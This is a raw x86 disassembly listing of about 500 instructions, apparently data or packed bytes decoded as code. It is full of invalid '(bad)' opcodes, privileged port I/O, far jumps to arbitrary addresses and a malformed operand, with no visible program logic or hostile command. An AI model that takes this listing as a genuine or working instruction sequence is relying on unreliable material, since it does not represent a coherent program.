  41f5e6:	add    esi,DWORD PTR [eax]
  41f5e8:	dec    edx
  41f5e9:	fcomp  DWORD PTR [eax-0x77e67c77]
  41f5ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f5f0:	(bad)  
  41f5f1:	and    BYTE PTR [eax],al
  41f5f3:	test   eax,0xeb8bec08
  41f5f8:	dec    ebp
  41f5f9:	or     ch,BYTE PTR [ebx+eiz*2+0x76]
  41f5fd:	xor    BYTE PTR [ebx],dh
  41f5ff:	sbb    DWORD PTR [edx-0x243ab0e4],esp
  41f605:	icebp  
  41f606:	bound  edi,QWORD PTR [ebx*2+0x2002cb73]
  41f60d:	jg     0x41f5f8
  41f60f:	xchg   ecx,eax
  41f610:	pop    ss
  41f611:	shr    dl,0x64
  41f614:	imul   DWORD PTR [edx]
  41f616:	les    edi,FWORD PTR [ebx+0x11]
  41f619:	xchg   ecx,eax
  41f61a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f61b:	cmp    al,0xfc
  41f61d:	push   0xb925c7af
  41f622:	aas    
  41f623:	je     0x41f5f0
  41f625:	fchs   
  41f627:	cld    
  41f628:	das    
  41f629:	and    eax,DWORD PTR [eax-0x17]
  41f62c:	dec    ebx
  41f62d:	xor    bl,BYTE PTR [edx-0x414f4a61]
  41f633:	or     esp,DWORD PTR [esi-0x4289b8ae]
  41f639:	ins    DWORD PTR es:[edi],dx
  41f63a:	inc    edx
  41f63b:	stc    
  41f63c:	outs   dx,DWORD PTR ds:[esi]
  41f63d:	ror    DWORD PTR [edi+0x9],1
  41f640:	lds    ebx,FWORD PTR [eax+0x6371e08a]
  41f646:	ror    DWORD PTR [ebx-0x55],0x45
  41f64a:	and    al,BYTE PTR [edi+0x72e5dc24]
  41f650:	fdivr  DWORD PTR [eax-0x1bd5edd7]
  41f656:	int    0x6e
  41f658:	sub    ebx,DWORD PTR [esi]
  41f65a:	hlt    
  41f65b:	xchg   edx,eax
  41f65c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f65d:	iret   
  41f65e:	pop    edi
  41f65f:	xlat   BYTE PTR ds:[ebx]
  41f660:	call   0x7cea:0x2bfeda89
  41f667:	xlat   BYTE PTR ds:[ebx]
  41f668:	test   DWORD PTR [edi+ecx*2+0x33d9eebb],0xd39a76ef
  41f673:	ds in  al,0x1a
  41f676:	(bad)  
  41f677:	stos   DWORD PTR es:[edi],eax
  41f678:	(bad)  
  41f679:	jno    0x41f6f5
  41f67b:	adc    eax,0x9544eedb
  41f680:	adc    al,ch
  41f682:	in     eax,dx
  41f683:	mov    edi,0xd58ed45b
  41f688:	into   
  41f689:	mov    ebx,0xb06fc8dc
  41f68e:	mov    edx,0x63f65279
  41f693:	sub    dl,bh
  41f695:	sub    al,0x84
  41f697:	dec    edx
  41f698:	pop    esi
  41f699:	cmc    
  41f69a:	jo     0x41f67c
  41f69c:	xchg   ebp,ebx
  41f69e:	pop    es
  41f69f:	out    0x39,eax
  41f6a1:	adc    esp,esi
  41f6a3:	inc    BYTE PTR [ebx]
  41f6a5:	dec    edi
  41f6a6:	push   esi
  41f6a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6a8:	arpl   WORD PTR [ebx],si
  41f6aa:	mov    edx,0x74d0c175
  41f6af:	out    dx,al
  41f6b0:	enter  0x421f,0x1b
  41f6b4:	or     DWORD PTR [ebx+eax*1],edx
  41f6b7:	popa   
  41f6b8:	xchg   edx,eax
  41f6b9:	or     esi,DWORD PTR [ebx]
  41f6bb:	cwde   
  41f6bc:	cmp    BYTE PTR [ecx+ebx*4+0x1fcedae6],bl
  41f6c3:	inc    ecx
  41f6c4:	jecxz  0x41f678
  41f6c6:	xchg   esi,eax
  41f6c7:	(bad)  
  41f6c8:	jnp    0x41f698
  41f6ca:	xor    al,0xb5
  41f6cc:	call   0x41c7:0x6c885744
  41f6d3:	popf   
  41f6d4:	mov    ds:0xc3d106ad,al
  41f6d9:	icebp  
  41f6da:	ja     0x41f66a
  41f6dc:	jbe    0x41f728
  41f6de:	mov    ebx,0xeb0eaf74
  41f6e3:	mov    esp,0x43ef97cf
  41f6e8:	scas   al,BYTE PTR es:[edi]
  41f6e9:	jle    0x41f720
  41f6eb:	xor    DWORD PTR [ebx],0x464cf021
  41f6f1:	push   ds
  41f6f2:	into   
  41f6f3:	ret    
  41f6f4:	jne    0x41f6e0
  41f6f6:	sub    DWORD PTR [eax],esp
  41f6f8:	fcomip st,st(0)
  41f6fa:	pusha  
  41f6fb:	xchg   BYTE PTR [edx+0x21],ah
  41f6fe:	xchg   edi,eax
  41f6ff:	push   0xffffffdc
  41f701:	mov    eax,ds:0x39bdefa7
  41f706:	out    0xd8,eax
  41f708:	mov    BYTE PTR [ecx+0x9bd8445],bh
  41f70e:	push   esi
  41f70f:	dec    esi
  41f710:	test   BYTE PTR [edi],ch
  41f712:	sbb    DWORD PTR [ecx+0x6a2a12ff],ebx
  41f718:	or     al,0x8
  41f71a:	push   ebx
  41f71b:	aad    0xbb
  41f71d:	(bad)  
  41f71e:	sub    DWORD PTR [ecx+0x2095e47e],edx
  41f724:	mov    esi,ebx
  41f726:	pop    ds
  41f727:	xlat   BYTE PTR ds:[ebx]
  41f728:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f729:	pop    ebp
  41f72a:	rol    BYTE PTR [edx+0x3e533881],1
  41f730:	imul   edx,DWORD PTR [esi+edx*4-0x6e],0xdb2f422c
  41f738:	push   esp
  41f739:	cmp    DWORD PTR [ebp-0x1a927f67],edi
  41f73f:	in     al,0x79
  41f741:	retf   0x51c1
  41f744:	mov    ah,0x4f
  41f746:	ins    BYTE PTR es:[edi],dx
  41f747:	mov    BYTE PTR ds:0x315fbfdf,ch
  41f74d:	and    esi,DWORD PTR [ebx-0x31]
  41f750:	mov    dh,BYTE PTR [ebx]
  41f752:	mov    bh,0xff
  41f754:	into   
  41f755:	push   ss
  41f756:	out    dx,eax
  41f757:	stc    
  41f758:	xlat   BYTE PTR ds:[ebx]
  41f759:	rcl    DWORD PTR [ecx+eiz*1+0x7eb4f626],1
  41f760:	cmp    DWORD PTR [ecx-0x51],0xe7883ea2
  41f767:	cwde   
  41f768:	lea    esi,[esi+0x62a6dccc]
  41f76e:	shr    DWORD PTR [eax-0x7e],cl
  41f771:	and    edx,DWORD PTR ds:0xc7d638c1
  41f777:	jecxz  0x41f778
  41f779:	dec    ebp
  41f77a:	adc    al,0x5b
  41f77c:	sbb    eax,0xffffff98
  41f77f:	repnz mov eax,ds:0xf87880d7
  41f785:	xchg   BYTE PTR [eax],dh
  41f787:	dec    edx
  41f788:	lods   eax,DWORD PTR ds:[esi]
  41f789:	sbb    edx,DWORD PTR [edi-0x68b6b413]
  41f78f:	push   ss
  41f790:	stos   DWORD PTR es:[edi],eax
  41f791:	(bad)  
  41f792:	push   cs
  41f793:	rol    DWORD PTR [edx+0x2],1
  41f796:	aam    0x6b
  41f798:	jbe    0x41f79d
  41f79a:	adc    ebx,edx
  41f79c:	add    ecx,DWORD PTR [ecx+0x39dd2a38]
  41f7a2:	arpl   WORD PTR [edx+edx*2-0xc091b17],ax
  41f7a9:	das    
  41f7aa:	call   0x41a2:0x73ab1074
  41f7b1:	ss aam 0x43
  41f7b4:	lock lock adc ebx,DWORD PTR ds:0xd0f10a66
  41f7bc:	and    DWORD PTR [esi-0x67],ecx
  41f7bf:	scas   al,BYTE PTR es:[edi]
  41f7c0:	pop    es
  41f7c1:	(bad)  
  41f7c2:	in     eax,0xce
  41f7c4:	wbinvd 
  41f7c6:	and    DWORD PTR [ebp-0x46],edx
  41f7c9:	adc    eax,DWORD PTR [esp+ebx*2]
  41f7cc:	jb     0x41f7b2
  41f7ce:	iret   
  41f7cf:	lahf   
  41f7d0:	scas   eax,DWORD PTR es:[edi]
  41f7d1:	add    eax,0x4e4c3df0
  41f7d6:	mov    ds:0x6959867e,eax
  41f7db:	jne    0x41f786
  41f7dd:	test   DWORD PTR [ebp-0x52412a43],edi
  41f7e3:	add    bh,BYTE PTR [ebx+0x79b6c58e]
  41f7e9:	lock out 0x3f,eax
  41f7ec:	ret    
  41f7ed:	div    DWORD PTR [esi+edx*1+0x239e1092]
  41f7f4:	push   es
  41f7f5:	adc    eax,0x495b5f89
  41f7fa:	inc    esp
  41f7fb:	xlat   BYTE PTR ds:[ebx]
  41f7fc:	jnp    0x41f862
  41f7fe:	xor    DWORD PTR [ecx],esp
  41f800:	ror    DWORD PTR [ebx+0x2e],0xe1
  41f804:	das    
  41f805:	xchg   ebp,eax
  41f806:	jo     0x41f7ce
  41f808:	inc    esp
  41f809:	mov    ds:0x4e79fe33,al
  41f80e:	cmp    bl,BYTE PTR [edi+eiz*4-0x5a]
  41f812:	test   al,0x13
  41f814:	sub    eax,0x70155e9
  41f819:	fcomi  st,st(2)
  41f81b:	out    0x3b,eax
  41f81d:	repnz and eax,0x24003260
  41f823:	ret    0x6a0e
  41f826:	mov    esi,0xaf118a70
  41f82b:	ds ret 
  41f82d:	std    
  41f82e:	mov    bl,0x94
  41f830:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f831:	ret    
  41f832:	in     al,dx
  41f833:	scas   eax,DWORD PTR es:[edi]
  41f834:	xor    BYTE PTR [edx+ebp*1+0x6e],0x1e
  41f839:	scas   al,BYTE PTR es:[edi]
  41f83a:	push   es
  41f83b:	ret    0xee06
  41f83e:	neg    DWORD PTR ds:[ebx+0x3896ddde]
  41f845:	repz push ds
  41f847:	nop
  41f848:	ins    DWORD PTR es:[edi],dx
  41f849:	fild   WORD PTR ds:0xc4b39505
  41f84f:	fucom  st(3)
  41f851:	sbb    DWORD PTR [ebx],ecx
  41f853:	jo     0x41f82a
  41f855:	dec    edx
  41f856:	rol    DWORD PTR [edx],cl
  41f858:	retf   
  41f859:	xor    DWORD PTR [edi+0x7f],esp
  41f85c:	add    DWORD PTR [edx+eax*2],esp
  41f85f:	test   eax,0xfb61ceb3
  41f864:	push   edx
  41f865:	dec    ebx
  41f866:	add    al,0x64
  41f868:	xchg   esi,eax
  41f869:	sbb    edx,DWORD PTR [edi-0x4c]
  41f86c:	(bad)  
  41f86d:	mov    edx,0x20a2ebf4
  41f872:	cdq    
  41f873:	stc    
  41f874:	and    DWORD PTR [edx-0x51],edi
  41f877:	sub    DWORD PTR [ebx-0x784c6991],edx
  41f87d:	std    
  41f87e:	xor    al,0x5f
  41f880:	mov    edi,DWORD PTR [esp+eax*1+0x4342d1f8]
  41f887:	pushf  
  41f888:	jge    0x41f825
  41f88a:	pop    edi
  41f88b:	or     eax,0x66858880
  41f890:	pop    es
  41f891:	pop    ds
  41f892:	sbb    cl,BYTE PTR ds:0x9d346425
  41f898:	fild   QWORD PTR [eax+ebp*2-0x55]
  41f89c:	add    edi,DWORD PTR [ebx+0x6358515d]
  41f8a2:	pop    eax
  41f8a3:	call   0x76d842fb
  41f8a8:	lds    eax,FWORD PTR [esi+0x3]
  41f8ab:	(bad)
  41f8ae:	pop    ecx
  41f8af:	in     al,dx
  41f8b0:	push   ecx
  41f8b1:	adc    al,0x47
  41f8b3:	mov    ebp,0x56154f43
  41f8b8:	adc    al,0xf4
  41f8ba:	in     eax,dx
  41f8bb:	push   es
  41f8bc:	sbb    edx,DWORD PTR fs:[ebp+0x3d]
  41f8c0:	sbb    DWORD PTR [edi+edi*8+0x3c315741],ebx
  41f8c7:	mov    esp,0xc4b1adf0
  41f8cc:	jo     0x41f8b0
  41f8ce:	push   ebp
  41f8cf:	repz pop ss
  41f8d1:	xchg   ecx,eax
  41f8d2:	bound  eax,QWORD PTR [ebx+0x4b]
  41f8d5:	dec    ebx
  41f8d6:	scas   al,BYTE PTR es:[edi]
  41f8d7:	sti    
  41f8d8:	cmp    eax,0x8bc5ad10
  41f8dd:	lds    esp,FWORD PTR [eax+0x66]
  41f8e0:	mov    ebx,0xdd6bdc58
  41f8e5:	xchg   DWORD PTR [ebx],eax
  41f8e7:	mov    ds:0x143ce998,al
  41f8ec:	inc    esp
  41f8ed:	mov    bl,0x20
  41f8ef:	dec    ebp
  41f8f0:	jg     0x41f8d5
  41f8f2:	js     0x41f8ec
  41f8f4:	pop    edi
  41f8f5:	scas   al,BYTE PTR es:[edi]
  41f8f6:	fist   DWORD PTR [edi-0x4c]
  41f8f9:	jmp    0x283674f2
  41f8fe:	xor    al,0x49
  41f900:	mov    ebp,0x541d181c
  41f905:	sbb    BYTE PTR [ebx-0x30501ef2],0xf2
  41f90c:	inc    ebx
  41f90d:	mov    dh,0x70
  41f90f:	mov    ds:0x1cc827d,al
  41f914:	xchg   edx,eax
  41f915:	and    cl,BYTE PTR [ecx+0x2278ba54]
  41f91b:	lods   eax,DWORD PTR ds:[esi]
  41f91c:	cs jne 0x41f994
  41f91f:	dec    edi
  41f920:	shl    DWORD PTR [ecx],cl
  41f922:	fisub  WORD PTR [eax]
  41f924:	ins    DWORD PTR es:[edi],dx
  41f925:	jbe    0x41f997
  41f927:	int3   
  41f928:	(bad)  
  41f929:	loope  0x41f963
  41f92b:	ret    0x40de
  41f92e:	and    al,0xe3
  41f930:	mov    cs,WORD PTR [ecx+eax*8]
  41f933:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f934:	mov    ebx,0x2277ceec
  41f939:	dec    edi
  41f93a:	scas   eax,DWORD PTR es:[edi]
  41f93b:	or     al,0x7d
  41f93d:	loope  0x41f8fc
  41f93f:	popf   
  41f940:	mov    edx,0x1d8b59d7
  41f945:	pushf  
  41f946:	cwde   
  41f947:	cmp    DWORD PTR [ebx+0x63d795cb],ebp
  41f94d:	push   ebp
  41f94e:	sub    al,0xd8
  41f950:	add    ch,ah
  41f952:	dec    edi
  41f953:	push   es
  41f954:	xchg   ebp,eax
  41f955:	adc    al,0xa1
  41f957:	aas    
  41f958:	ds add bl,ch
  41f95b:	dec    eax
  41f95c:	je     0x41f944
  41f95e:	fbstp  TBYTE PTR [ebx-0x39a6fc9d]
  41f964:	fisttp QWORD PTR [ebp-0x246526e7]
  41f96a:	push   cs
  41f96b:	stc    
  41f96c:	pop    ss
  41f96d:	arpl   WORD PTR [eax],bx
  41f96f:	inc    ecx
  41f970:	gs imul ebp,ecx,0xffffffc0
  41f974:	lock jg 0x41f901
  41f977:	shl    DWORD PTR [esi-0x7b271cb4],1
  41f97d:	(bad)  
  41f97e:	inc    BYTE PTR [edi+0x58ab2147]
  41f984:	lahf   
  41f985:	stos   DWORD PTR es:[edi],eax
  41f986:	cmp    DWORD PTR [eax+0x25],edx
  41f989:	adc    BYTE PTR [ebx],ah
  41f98b:	sub    ebp,eax
  41f98d:	xor    DWORD PTR [esi+0x40],ebx
  41f990:	and    BYTE PTR [ebx],bl
  41f992:	xchg   ecx,eax
  41f993:	lahf   
  41f994:	imul   edx,DWORD PTR [ebx],0xa469fb3f
  41f99a:	(bad)  
  41f99b:	cmp    DWORD PTR [ebp-0x3efdb328],esi
  41f9a1:	ret    0xee14
  41f9a4:	enter  0xef72,0x9f
  41f9a8:	out    dx,eax
  41f9a9:	popa   
  41f9aa:	jne    0x41f941
  41f9ac:	aaa    
  41f9ad:	imul   ebp,DWORD PTR [ebp-0x6ac2c424],0x605f8fcf
  41f9b7:	enter  0xb2e1,0x49
  41f9bb:	inc    ebp
  41f9bc:	or     eax,0x9700c64b
  41f9c1:	mov    ebp,0x6ec4b899
  41f9c6:	xchg   esp,eax
  41f9c7:	cmp    eax,0x12a2ff70
  41f9cc:	aad    0x11
  41f9ce:	mov    eax,ds:0x566d9944
  41f9d3:	or     bh,BYTE PTR [edi-0x6f]
  41f9d6:	sub    eax,0xb57aa7d3
  41f9db:	fisub  DWORD PTR [ecx+0x73]
  41f9de:	jo     0x41fa12
  41f9e0:	inc    ecx
  41f9e1:	fisttp WORD PTR [ecx]
  41f9e3:	push   edx
  41f9e4:	rol    BYTE PTR [edx],cl
  41f9e6:	pop    edi
  41f9e7:	inc    edi
  41f9e8:	(bad)  
  41f9e9:	addr16 sbb ebx,ebp
  41f9ec:	xchg   ecx,eax
  41f9ed:	aaa    
  41f9ee:	jge    0x41f9de
  41f9f0:	aam    0x73
  41f9f2:	out    dx,al
  41f9f3:	mov    BYTE PTR [ebp-0x7e],ah
  41f9f6:	jns    0x41fa34
  41f9f8:	or     dh,BYTE PTR ss:[esi+0x73e3c958]
  41f9ff:	jns    0x41fa11
  41fa01:	lods   eax,DWORD PTR ds:[esi]
  41fa02:	mov    al,ds:0x450e6f85
  41fa07:	xor    bh,ah
  41fa09:	call   0x2f7aabfd
  41fa0e:	fnstsw WORD PTR [edx-0x30]
  41fa11:	or     dl,BYTE PTR ds:0x2c3a9332
  41fa17:	jmp    0x41fa93
  41fa19:	xchg   esi,eax
  41fa1a:	jns    0x41fa14
  41fa1c:	jb     0x41f9fa
  41fa1e:	cdq    
  41fa1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa20:	xor    BYTE PTR [esi],bl
  41fa22:	mov    bh,0x39
  41fa24:	les    ebx,FWORD PTR [edx]
  41fa26:	dec    edi
  41fa27:	loopne 0x41f9c8
  41fa29:	mov    fs,edx
  41fa2b:	jb     0x41f9bf
  41fa2d:	xor    BYTE PTR [eax],al
  41fa2f:	fdivrp st(7),st
  41fa31:	outs   dx,BYTE PTR ds:[esi]
  41fa32:	lahf   
  41fa33:	and    al,0x91
  41fa35:	mov    ch,0x29
  41fa37:	or     ah,dh
  41fa39:	mov    esp,0xfa289720
  41fa3e:	enter  0xdde,0x86
  41fa42:	jecxz  0x41fa31
  41fa44:	call   0x88d2db58
  41fa49:	bound  eax,QWORD PTR [esp+eax*1+0x59fcef1b]
  41fa50:	loopne 0x41f9f6
  41fa52:	xlat   BYTE PTR ds:[ebx]
  41fa53:	repnz outs dx,BYTE PTR ds:[esi]
  41fa55:	inc    eax
  41fa56:	pop    es
  41fa57:	and    ebx,DWORD PTR [edi+ebx*8-0x5c49a6d3]
  41fa5e:	fsubr  DWORD PTR [esi]
  41fa60:	test   al,0xd8
  41fa62:	mov    edi,0x38ffb199
  41fa67:	inc    esp
  41fa68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa69:	repz sbb al,0x8c
  41fa6c:	jmp    0x41fa01
  41fa6e:	adc    ebx,esp
  41fa70:	ret    
  41fa71:	jle    0x41f9f6
  41fa73:	out    dx,eax
  41fa74:	and    eax,0x40bda08b
  41fa79:	or     al,0x5
  41fa7b:	dec    esi
  41fa7c:	ja     0x41fab5
  41fa7e:	dec    edx
  41fa7f:	ins    DWORD PTR es:[edi],dx
  41fa80:	adc    dh,BYTE PTR [ebp-0x35a74f2b]
  41fa86:	in     al,dx
  41fa87:	and    BYTE PTR [edi+0x0],cl
  41fa8a:	fist   DWORD PTR [edx+0x73]
  41fa8d:	dec    ebp
  41fa8e:	mov    esi,0xac5540b3
  41fa93:	sbb    ch,BYTE PTR [ebx-0x38949000]
  41fa99:	call   0x49da:0x192b9e7
  41faa0:	jl     0x41fb1a
  41faa2:	pop    ecx
  41faa3:	lock std 
  41faa5:	in     eax,dx
  41faa6:	mov    esp,0xfc0a974c
  41faab:	xor    eax,0xae2ae33a
  41fab0:	pop    es
  41fab1:	push   edx
  41fab2:	ret    0x3af6
  41fab5:	int3   
  41fab6:	bound  eax,QWORD PTR [ecx+0x125aa35f]
  41fabc:	and    ah,ah
  41fabe:	pop    ds
  41fabf:	outs   dx,BYTE PTR ds:[esi]
  41fac0:	clc    
  41fac1:	inc    edx
  41fac2:	aam    0x17
  41fac4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fac5:	lock xchg ecx,eax
  41fac7:	or     bh,BYTE PTR [ecx]
  41fac9:	inc    edx
  41faca:	jb     0x41fad5
  41facc:	ss jo  0x41fa63
  41facf:	(bad)  
  41fad0:	int    0xc7
  41fad2:	mov    esp,0xbe8262f8
  41fad7:	dec    edi
  41fad8:	mov    edx,DWORD PTR [si]
  41fadb:	cmp    esp,DWORD PTR [ebp+0x38]
  41fade:	push   esi
  41fadf:	(bad)  
  41fae0:	push   DWORD PTR [edx]
  41fae2:	jae    0x41faff
  41fae4:	jns    0x41fa82
  41fae6:	hlt    
  41fae7:	test   al,0x11
  41fae9:	imul   eax,DWORD PTR [ebx+0x30],0x450e34a0
  41faf0:	fisttp DWORD PTR [ecx]
  41faf2:	lds    edi,FWORD PTR fs:[esi]
  41faf5:	xchg   ebx,eax
  41faf6:	outs   dx,DWORD PTR ds:[esi]
  41faf7:	pop    esi
  41faf8:	retf   
  41faf9:	stos   BYTE PTR es:[edi],al
  41fafa:	das    
  41fafb:	jp     0x41fac1
  41fafd:	les    edi,FWORD PTR [eax+edx*1+0x120a163e]
  41fb04:	add    DWORD PTR [eax+0x7b98b244],eax
  41fb0a:	or     esp,DWORD PTR [ebp+edx*4-0x7eaf28a0]
  41fb11:	ficomp WORD PTR [ebp-0x7f2ee686]
  41fb17:	shl    BYTE PTR [edi+0x362bb891],0xed
  41fb1e:	icebp  
  41fb1f:	jmp    0x1f3c:0x2c41dc44
  41fb26:	aad    0xf3
  41fb28:	jle    0x41fb73
  41fb2a:	or     dl,0x4a
  41fb2d:	pop    esi
  41fb2e:	pop    ss
  41fb2f:	or     BYTE PTR [ecx],ch
  41fb31:	in     eax,dx
  41fb32:	xchg   edx,eax
  41fb33:	push   ds
  41fb34:	out    0x1,eax
  41fb36:	jo     0x41fb7c
  41fb38:	inc    eax
  41fb39:	jl     0x41fbb6
  41fb3b:	mov    bl,0xf6
  41fb3d:	loopne 0x41fb1d
  41fb3f:	push   ds
  41fb40:	scas   eax,DWORD PTR es:[edi]
  41fb41:	movups XMMWORD PTR [eax],xmm1
  41fb44:	imul   eax,DWORD PTR [eax+0x7b10f00d],0xfffffffb
  41fb4b:	pop    ds
  41fb4c:	(bad)  
  41fb4d:	sbb    BYTE PTR [ecx-0x2f],bl
  41fb50:	or     ch,BYTE PTR ds:0xab65b821
  41fb56:	adc    ah,BYTE PTR [edi]
  41fb58:	fdivr  QWORD PTR [esp+edi*8]
  41fb5b:	(bad)  
  41fb5c:	push   ecx
  41fb5d:	mov    ebx,0x4e9d4805
  41fb62:	scas   al,BYTE PTR es:[edi]
  41fb63:	imul   DWORD PTR [esi]
  41fb65:	lahf   
  41fb66:	and    DWORD PTR [edx-0x7da25042],ecx
  41fb6c:	push   edx
  41fb6d:	mov    ebx,0x15e271e2
  41fb72:	push   esp
  41fb73:	pop    esi
  41fb74:	rcr    BYTE PTR [eax-0x46],1
  41fb77:	(bad)  
  41fb78:	mov    cs:0xcf790d62,al
  41fb7e:	lds    ebp,FWORD PTR [edx]
  41fb80:	repz idiv bl
  41fb83:	in     eax,0x6d
  41fb85:	mov    ch,0x4d
  41fb87:	lea    ebx,[esi+0x70]
  41fb8a:	shl    DWORD PTR [eax-0x5a],1
  41fb8d:	outs   dx,DWORD PTR ds:[esi]
  41fb8e:	(bad)  
  41fb90:	dec    edi
  41fb91:	mov    ebp,0xf5f6b66c
  41fb96:	call   DWORD PTR [ebx-0x69798e2]
  41fb9c:	push   edx
  41fb9d:	jne    0x41fbb0
  41fb9f:	inc    ebp
  41fba0:	xor    ah,al
  41fba2:	sbb    al,0x67
  41fba4:	mov    ?,WORD PTR [esi-0x6add366e]
  41fbaa:	outs   dx,DWORD PTR ds:[esi]
  41fbab:	adc    eax,0x965c6a4a
  41fbb0:	pop    eax
  41fbb1:	out    dx,al
  41fbb2:	jg     0x41fb4c
  41fbb4:	int    0xac
  41fbb6:	loopne 0x41fba0
  41fbb8:	in     al,0xc7
  41fbba:	cmp    eax,0xa4773e09
  41fbbf:	aaa    
  41fbc0:	(bad)  
  41fbc1:	lods   eax,DWORD PTR ds:[esi]
  41fbc2:	retf   0xd4a2
  41fbc5:	int    0x65
  41fbc7:	out    dx,al
  41fbc8:	imul   eax,DWORD PTR [ecx],0x7d
  41fbcb:	shr    BYTE PTR [eax],0xa3
  41fbce:	cld    
  41fbcf:	adc    ah,cl
  41fbd1:	lds    edi,FWORD PTR [edx]
  41fbd3:	fstp   DWORD PTR [esi+ecx*8-0x70ab3faa]
  41fbda:	and    al,0x21
  41fbdc:	push   edx
  41fbdd:	add    eax,DWORD PTR [edi]
  41fbdf:	add    DWORD PTR ds:0xb48608c2,edx
  41fbe5:	push   ebp
  41fbe6:	mov    ah,0x99
  41fbe8:	add    edi,DWORD PTR [ebx]
  41fbea:	jmp    0x90f4822e
  41fbef:	fcomp  DWORD PTR [esi+0x57]
  41fbf2:	mov    ch,ah
  41fbf4:	jo     0x41fb88
  41fbf6:	fs repz mov al,0xd3
  41fbfa:	inc    edi
  41fbfb:	pop    edx
  41fbfc:	adc    edx,DWORD PTR [eax+0x13]
  41fbff:	sub    BYTE PTR ds:0x2185388d,dl
  41fc05:	jae    0x41fc2a
  41fc07:	cmp    DWORD PTR cs:[ecx+0x7b],esp
  41fc0b:	jne    0x41fbb0
  41fc0d:	test   eax,0xdd9f6494
  41fc12:	dec    BYTE PTR [ecx]
  41fc14:	cmp    al,0xc0
  41fc16:	std    
  41fc17:	xchg   ecx,eax
  41fc18:	fild   WORD PTR [edx+0x296a7233]
  41fc1e:	ror    BYTE PTR [ebx-0x6d],0x29
  41fc22:	jle    0x41fc96
  41fc24:	mov    al,0xa7
  41fc26:	dec    edx
  41fc27:	das    
  41fc28:	xchg   ax,ax
  41fc2a:	addr16 mov esi,0xfb206b0c
  41fc30:	cmp    al,0x53
  41fc32:	fild   WORD PTR [ecx-0x6c]
  41fc35:	sub    eax,0xf704ed24
  41fc3a:	jle    0x41fc33
  41fc3c:	test   al,0x3a
  41fc3e:	and    BYTE PTR [esi+0x43],cl
  41fc41:	mov    dh,0xe0
  41fc43:	out    0x9b,al
  41fc45:	pop    ebx
  41fc46:	push   0xf2fa3641
  41fc4b:	shl    BYTE PTR [ecx-0x348e8627],cl
  41fc51:	adc    dh,BYTE PTR [edx+0x62]
  41fc54:	aam    0x4e
  41fc56:	xlat   BYTE PTR ds:[ebx]
  41fc57:	mov    ch,BYTE PTR [esi+0x2edad254]
  41fc5d:	loope  0x41fc4b
  41fc5f:	jnp    0x41fc5f
  41fc61:	mov    ch,0x96
  41fc63:	adc    al,0xde
  41fc65:	pop    ebx
  41fc66:	push   ebx
  41fc67:	test   BYTE PTR [edi+0x455f850c],0x83
  41fc6e:	dec    eax
  41fc6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fc70:	stos   BYTE PTR es:[edi],al
  41fc71:	and    eax,0x2082091e
  41fc76:	ss push ss
  41fc78:	and    eax,0xc08f17
  41fc7d:	jne    0x41fc8c
  41fc7f:	rol    DWORD PTR [eax-0x5f43a884],0x23
  41fc86:	jle    0x41fcba
  41fc88:	cli    
  41fc89:	pxor   mm4,QWORD PTR [eax-0x373ce4a3]
  41fc90:	mov    dl,cl
  41fc92:	mov    ah,0x54
  41fc94:	dec    ebp
  41fc95:	mov    DWORD PTR [edx+ebp*8-0x3d],ecx
  41fc99:	sbb    eax,0xcac76a20
  41fc9e:	rol    DWORD PTR [ecx+0x6066153b],0x88
  41fca5:	push   edx
  41fca6:	cmp    BYTE PTR [esp+edx*2+0x38],dl
  41fcaa:	pop    ebx
  41fcab:	xchg   ecx,eax
  41fcac:	inc    eax
  41fcad:	in     al,0xaa
  41fcaf:	xchg   esi,eax
  41fcb0:	(bad)  
  41fcb1:	mov    edx,0x647c1d16
  41fcb6:	cmp    bl,bl
  41fcb8:	ins    BYTE PTR es:[edi],dx
  41fcb9:	xchg   DWORD PTR [ecx+0x6a],esp
  41fcbc:	jecxz  0x41fd0e
  41fcbe:	mov    edi,0x3f2f3c30
  41fcc3:	or     BYTE PTR [esi-0x236e7afb],0xa3
  41fcca:	pop    ebp
  41fccb:	ror    BYTE PTR [ebx],cl
  41fccd:	mov    dh,0xcd
  41fccf:	mov    bl,BYTE PTR [esi+0x6ae22805]
  41fcd5:	and    DWORD PTR [ebp+0x45005960],0x55815e32
  41fcdf:	stos   DWORD PTR es:[edi],eax
  41fce0:	xchg   DWORD PTR [eax],ebp
  41fce2:	cmp    BYTE PTR [eax+0x7e],cl
  41fce5:	pop    ebx
  41fce6:	in     eax,0x36
  41fce8:	popf   
  41fce9:	mov    ch,0x12
  41fceb:	xchg   edx,esi
  41fced:	cdq    
  41fcee:	(bad)  
  41fcef:	adc    BYTE PTR [ecx+0x7e604a72],dl
  41fcf5:	mov    ebp,0x80e7ac46
  41fcfa:	push   eax
  41fcfb:	mov    ebx,0x62e75660
  41fd00:	mov    edx,DWORD PTR [ecx-0x1f]
  41fd03:	sbb    BYTE PTR ds:0xf901d12b,al
  41fd09:	push   ss
  41fd0a:	test   eax,0xe8439d11
  41fd0f:	or     ebp,DWORD PTR [esi-0x666068dc]
  41fd15:	jns    0x41fce3
  41fd17:	fsubr  DWORD PTR [edx-0x29]
  41fd1a:	push   ss
  41fd1b:	cmp    BYTE PTR [ecx-0x1729057e],ah
  41fd21:	jns    0x41fcf6
  41fd23:	sti    
  41fd24:	cld    
  41fd25:	daa    
  41fd26:	lods   al,BYTE PTR ds:[esi]
  41fd27:	aad    0x83
  41fd29:	addr16 or eax,0x47e18996
  41fd2f:	xchg   BYTE PTR [eax+0x155d4967],dh
  41fd35:	fadd   st,st(4)
  41fd37:	sbb    edx,DWORD PTR [ecx-0x79]
  41fd3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd3b:	adc    eax,0xf426e226
  41fd40:	cmp    DWORD PTR [ebp+edi*4+0xb42c7f3],eax
  41fd47:	scas   eax,DWORD PTR es:[edi]
  41fd48:	xchg   esi,eax
  41fd49:	data16 fst QWORD PTR [eax-0x60]
  41fd4d:	(bad)  
